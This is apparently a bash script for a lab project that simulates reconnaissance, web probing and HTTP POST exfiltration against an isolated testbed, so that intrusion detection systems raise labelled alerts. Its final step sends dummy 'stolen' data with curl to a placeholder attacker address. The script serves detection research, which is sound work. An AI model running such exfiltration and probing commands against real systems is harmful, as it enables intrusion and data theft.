#!/bin/bash
# =====================================================================
# ATTACK SIMULATION SCRIPT — CONTROLLED LAB USE ONLY
# Part of NICS project G1140705 sub-project 4 (IDS -> CTI Kill-Chain).
# Purpose: generate labelled IDS/HIDS alerts on an ISOLATED testbed VM.
# Network addresses and credentials are placeholders (<TARGET_IP>,
# <ATTACKER_IP>, <TARGET_PASSWORD>) — set them for your own lab.
# Destructive artefacts have been neutralised; lines marked NEUTRALIZED
# show what the original simulation wrote. Do NOT run outside a
# disposable virtual machine.
# =====================================================================


# -------------------------------
# Level 2 - Phase 3: Recon + Initial Access + C2 + Exfiltration
# -------------------------------

TARGET_IP="<TARGET_IP>"
ATTACKER_IP="<ATTACKER_IP>"  # Kali IP

echo "[+] Starting Level 2 - Phase 3"

# 1. Simulate DNS Query (Reconnaissance)
echo "[+] Performing DNS Reconnaissance (dig google.com)..."
dig @${TARGET_IP} google.com

# 2. HTTP GET to simulate probing vulnerable web path
echo "[+] Simulating HTTP GET to /vulnerable path..."
curl http://${TARGET_IP}/vulnerable -o /dev/null --connect-timeout 2

# 3. Simulate domain lookup for infrastructure setup (dig to registrar)
echo "[+] Simulating infrastructure acquisition reconnaissance..."
dig @${TARGET_IP} namecheap.com

# 4. Simulate exfiltration using HTTP POST
echo "[+] Simulating HTTP POST exfiltration to attacker..."
curl -X POST -d "stolen=data&filename=dump.txt" http://${ATTACKER_IP}/upload

echo "[+] Level 2 - Phase 3 simulation complete."

